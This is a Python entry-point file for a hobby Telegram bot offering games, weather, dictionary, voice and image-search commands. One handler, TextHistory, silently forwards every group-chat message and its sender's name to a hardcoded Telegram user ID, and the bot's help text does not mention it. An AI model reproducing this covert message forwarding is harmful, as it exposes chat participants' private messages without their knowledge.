from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from Handler import Delete
from TicTacToe import TicTacToe, TicTacToeQuery, TicTacToeAI, TicTacToeAIQuery
from Music import Music, MusicQuery
from Weather import Weather, Temperature
from Dictionary import Dictionary
from Voice import Voice, Settings, SettingsQuery, SpeechRecognition, Language, LanguageQuery
from Datetime import Date, Time, DatetimeQuery
from Calculator import Calculator, CalculatorQuery
from Image import Search, SearchQuery
from Sokoban import Sokoban, SokobanQuery
from Leaderboard import Alive, Lasma, LasmaQuery
from Snake import Snake, SnakeQuery
from Draw import Draw, DrawQuery
from Chess import Chess, ChessQuery
import os

def Help(update, context):
	Command = {"start": "To get all commands info", "help": "To get all commands info", "credits": "Credits and special thanks", "tictactoe": "To play tic tac toe game with your friends", "p [Title]": "To play YouTube music base on the title given", "weather [Location]": "To get weather info base on the location given", "temp [Location]": "To get temperature info base on the location given", "d [Query]": "To get word definations and pronunciation base on the query given", "s [Sentences]": "Convert the sentences given to an audio file", "settings": "Audio accent change base on different languages", "date": "To get today date base on different timezones", "time": "To get current time base different timezones", "cal": "To summon a calculator", "search [Query]": "To find images", "chess": "To play chess with your friends", "sokoban": "To play sokoban game", "snake": "To play greedy snake game", "tictactoeai": "To play tic tac toe game with smart AI", "lasma": "Create a virtual leaderboard using Lasma leaderboard API"}
	update.effective_message.reply_text("Commands Info:\n{}".format("".join([f"/{i} - {Command[i]}\n" for i in Command])))

def Credits(update, context):
	update.effective_message.reply_text(
	"""
	Credits:
	This bot was made by @BenjaminThio
	This bot project started in 9/3/2021 and ended in 1/1/2022
	Language used: Python
	Source Code: https://replit.com/@BenjaminThio/Lasma-Studio-Telegram
	Company's Name: LASMA STUDIO
	"""
	)

def Info(update, context):
	if len(context.args) > 0:
		ChatID = update.effective_message.chat_id
		User = update.effective_user
	else:
		try:
			ChatID = update.effective_message.reply_to_message.chat.id
			User = update.effective_message.reply_to_message.from_user
		except:
			return update.effective_message.reply_text("/info [User ID] or reply to somebody message")
	String = f"Chat ID: {ChatID}\nUser ID: {User.id}\nName: {User.name}\nUsername: {User.username}\nFirst Name: {User.first_name}\nLast Name: {User.last_name}"
	if context.bot.get_user_profile_photos(User.id).total_count > 0:
		context.bot.get_file(context.bot.get_user_profile_photos(User.id).photos[0][-1]).download("Profile.png")
		context.bot.send_photo(chat_id=ChatID, photo=open("Profile.png", "rb"), caption=String)
		os.remove("Profile.png")
	else:
		update.effective_message.reply_text(f"Profile Photo: None\n{String}")

def TextHistory(update, context):
	Message = update.effective_message
	User = update.effective_user
	if Message.chat_id != User.id:
		for i in [1074283475]:
			context.bot.send_message(i, f"{Message.text} by {User.name}")

def CallbackQuery(update, context):
	Query = update.callback_query
	Data = Query.data.split(",")
	if Data[0] == "None": return Query.bot.answer_callback_query(callback_query_id=Query.id, text="Blocked", show_alert=True)
	elif Data[0] == "Chess": return ChessQuery(Query)
	try:
		if Data[1] != str(Query.from_user.id): return Query.bot.answer_callback_query(callback_query_id=Query.id, text="This is not your property :D", show_alert=True)
	except: pass
	if Data[0] == "Delete": return Delete(Query)
	elif Data[0] == "TicTacToe": return TicTacToeQuery(Query)
	elif Data[0] == "Music": return MusicQuery(update, context)
	elif Data[0] == "Voice": return SettingsQuery(update, context)
	elif Data[0] == "Date" or Data[0] == "Time": return DatetimeQuery(Query, Data[0])
	elif Data[0] == "Calculator": return CalculatorQuery(Query)
	elif Data[0] == "Image": return SearchQuery(update, context)
	elif Data[0] == "Sokoban": return SokobanQuery(Query)
	elif Data[0] == "Snake": return SnakeQuery(Query)
	elif Data[0] == "TicTacToeAI": return TicTacToeAIQuery(Query)
	elif Data[0] == "Draw": return DrawQuery(update, context)
	elif Data[0] == "Lasma": return LasmaQuery(Query)
	elif Data[0] == "Language": return LanguageQuery(update, context)

def main():
	Alive()
	updater = Updater(os.getenv("TOKEN"))
	ud = updater.dispatcher
	ud.add_handler(CommandHandler("start", Help))
	ud.add_handler(CommandHandler("help", Help))
	ud.add_handler(CommandHandler("credits", Credits))
	ud.add_handler(CommandHandler("tictactoe", TicTacToe))
	ud.add_handler(CommandHandler("p", Music))
	ud.add_handler(CommandHandler("weather", Weather))
	ud.add_handler(CommandHandler("temp", Temperature))
	ud.add_handler(CommandHandler("d", Dictionary))
	ud.add_handler(CommandHandler("s", Voice))
	ud.add_handler(CommandHandler("settings", Settings))
	ud.add_handler(CommandHandler("date", Date))
	ud.add_handler(CommandHandler("time", Time))
	ud.add_handler(CommandHandler("cal", Calculator))
	ud.add_handler(CommandHandler("search", Search))
	ud.add_handler(CommandHandler("chess", Chess))
	ud.add_handler(CommandHandler("test", Chess))
	ud.add_handler(CommandHandler("sokoban", Sokoban))
	ud.add_handler(CommandHandler("snake", Snake))
	ud.add_handler(CommandHandler("tictactoeai", TicTacToeAI))
	ud.add_handler(CommandHandler("Draw", Draw))
	ud.add_handler(CommandHandler("lasma", Lasma))
	ud.add_handler(CommandHandler("info", Info))
	ud.add_handler(CommandHandler("sr", SpeechRecognition))
	ud.add_handler(CommandHandler("lang", Language))
	ud.add_handler(MessageHandler(Filters.text, TextHistory))
	ud.add_handler(CallbackQueryHandler(CallbackQuery))
	updater.start_polling()
	updater.idle()

if __name__ == "__main__": main()